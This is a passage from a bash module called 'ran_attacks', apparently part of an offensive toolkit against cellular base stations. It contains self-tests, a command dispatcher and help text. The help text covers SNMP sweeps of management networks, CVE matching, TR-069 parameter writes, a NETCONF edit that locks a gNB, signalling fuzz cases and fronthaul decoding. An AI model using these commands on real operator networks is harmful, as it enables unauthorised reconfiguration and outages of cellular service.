    _rc 'cwmp-inform-manufacturer' "$inform" 'Manufacturer	Ericsson'
    _rc 'cwmp-inform-product' "$inform" 'ProductClass	RBS6302'
    _rc 'cwmp-inform-serial' "$inform" 'SerialNumber	ABC123'

    # O1
    _rc 'o1-paths-gnb-id' "$(ran_o1_paths)" 'gnb-du-id'
    _rc 'o1-paths-state' "$(ran_o1_paths)" 'administrative-state'
    _rc 'o1-paths-module' "$(ran_o1_paths)" 'o-ran-uplane-conf'
    local edit; edit=$(ran_o1_edit '/o-ran-o1:o-ran/gnb-du/administrative-state' 'LOCKED')
    _rc 'o1-edit-value' "$edit" 'LOCKED'
    _rc 'o1-edit-ns' "$edit" 'urn:o-ran:o-ran-o1'
    _rc 'o1-hello' "$(ran_o1_hello)" 'urn:ietf:params:netconf:base:1.1'

    # fuzz catalogue
    local fz; fz=$(ran_fuzz_cases)
    _rk 'fuzz-cases' "$(printf '%s\n' "$fz" | tail -n +2 | wc -l)" '15'
    _rc 'fuzz-ngap' "$fz" 'InitialUEMessage'
    _rc 'fuzz-xnap' "$fz" 'XnSetupRequest'
    # the runner refuses rather than sending
    ran_cmd_fuzz target 127.0.0.1 38412 >"$d/fz.out" 2>&1; local fzrc=$?
    _rk 'fuzz-target-handoff' "$fzrc" '3'
    _rc 'fuzz-target-why' "$(cat "$d/fz.out")" 'builds and refuses'
    _rk 'fuzz-usage' "$(ran_cmd_fuzz >/dev/null 2>&1; echo $?)" '2'

    # fronthaul audit: the doctrine rows
    local audit; audit=$(ran_fronthaul_audit '' '' 2>/dev/null)
    _rc 'fh-audit-header' "$audit" 'question	state	value	why_unblock'
    _rc 'fh-no-input-transport' "$audit" 'transport	unobservable	unknown'
    _rc 'fh-no-input-iq' "$audit" 'iq_samples	unobservable'
    _rc 'fh-capture-spec' "$audit" 'capture_spec'
    _rc 'fh-spec-rate' "$audit" 'line rate, encoding'
    _rc 'fh-store-path' "$audit" 'store	'
    # with a rate supplied, the derived rows appear
    local audit2; audit2=$(ran_fronthaul_audit '' '9830.4' 2>/dev/null)
    _rc 'fh-rate-advertised' "$audit2" 'line_rate	advertised	9830.4'
    _rc 'fh-words' "$audit2" 'words_per_basic_frame	advertised	320'
    _rc 'fh-axc' "$audit2" 'axc_capacity	advertised	319'

    # the stores the assertions wrote stayed inside the temp tree
    _rk 'store-in-temp' "$([[ -f "$LOOT_DIR/ran/fronthaul.tsv" ]] && echo yes || echo no)" 'yes'

    LOOT_DIR="$saved_loot"
    rm -rf "$d"
    printf '\nRESULT %s (%d assertions)\n' "$([[ $bad -eq 0 ]] && echo PASS || echo FAIL)" "$a"
    return "$bad"
}

# ── CLI dispatch ─────────────────────────────────────────────────────
ran_cli_main() {
    local cmd="${1:-}"; shift || true
    case "$cmd" in
        --status-tsv)      ran_status_tsv ;;
        --scan-ems)        ran_cmd_scan_ems "${1:-}" "${2:-public}" "${3:-161}" "${4:-2}" ;;
        --acs)             ran_cmd_acs "$@" ;;
        --o1)              ran_cmd_o1 "$@" ;;
        --fuzz)            ran_cmd_fuzz "$@" ;;
        --inventory)       ran_cmd_inventory "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
        --check-plmn)      ran_plmn_check "${1:-}" "${2:-}" ;;
        --fronthaul)       ran_cmd_fronthaul "$@" ;;
        --cpri-options)    ran_cpri_options ;;
        --cpri-decode)     ran_cpri_decode_bits "${1:-}" ;;
        --cpri-sigmf)      ran_cpri_to_sigmf "${1:-}" "${2:-}" "${3:-1}" "${4:-16}" ;;
        --plan)            ran_plan ;;
        --selftest)        ran_selftest ;;
        --menu)            ran_menu ;;
        *)
            cat >&2 <<EOF
ran_attacks — the tower side: management planes, fronthaul, CVE inventory

This module approaches a base station the way an operator does: over the
transport network and on the interfaces that are supposed to be private.
Every verb that touches a network names its target and refuses without one.

Usage: $0 COMMAND

  RECON
  --status-tsv                 module state as TSV
  --scan-ems <host|cidr> [community] [port] [timeout]
                               SNMP sweep of the EMS / management VLAN;
                               records sysDescr, vendor, model, software
  --inventory [host vendor product sw]
                               the tower-side CVE table, or a match for one
                               host against it
  --check-plmn <mcc-mnc> [imsi-file-or-value]
                               is the broadcast PLMN a lab default, does it
                               agree with the subscribers on it, and what
                               would reading it properly need

  MANAGEMENT
  --acs inform <xml|->         parse a CWMP Inform
  --acs set <param> <value> [key]
                               an RFC-shaped SetParameterValues body
  --acs targets                the radio parameters worth writing and their cost
  --o1 paths                   the O1 YANG paths that matter
  --o1 hello                   a NETCONF hello with the O-RAN capabilities
  --o1 edit <yang-path> <value> [datastore]
                               an edit-config RPC for one leaf

  SIGNALLING
  --fuzz list                  the S1AP/NGAP/XnAP mutation catalogue
  --fuzz target <host> [port]  names what it will not send, and why (exit 3:
                               a handoff, not a failure)

  FRONTHAUL
  --fronthaul options          the CPRI line rates and their word counts
  --fronthaul types            the eCPRI message types
  --fronthaul parse <hex>      decode an eCPRI header
  --fronthaul audit [capture] [line-rate-mbps]
                               measured / advertised / unobservable rows, and
                               the capture spec when nothing was supplied
  --cpri-options               CPRI v7.0 option table
  --cpri-decode <raw-file>     8b/10b decode, hyperframe alignment, AxC check
  --cpri-sigmf <raw> <base> [axc] [words-per-frame]
                               CPRI bit stream to SigMF, which the air
                               interface modules already read

  --plan                       what this module needs to be useful
  --selftest                   verify the tables and the parsers
  --menu                       interactive menu
EOF
            return 2 ;;
    esac
}

ran_menu() {
    cat <<'M'
ran_attacks
  1  scan the EMS / management VLAN      --scan-ems
  2  match hosts against the CVE table   --inventory
  3  CWMP / TR-069 session               --acs
  4  O1 / NETCONF configuration          --o1
  5  S1AP / NGAP / XnAP mutations        --fuzz
  6  fronthaul (CPRI / eCPRI)            --fronthaul
  7  what this needs to be useful        --plan
  q  quit
M
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    ran_cli_main "$@"
fi
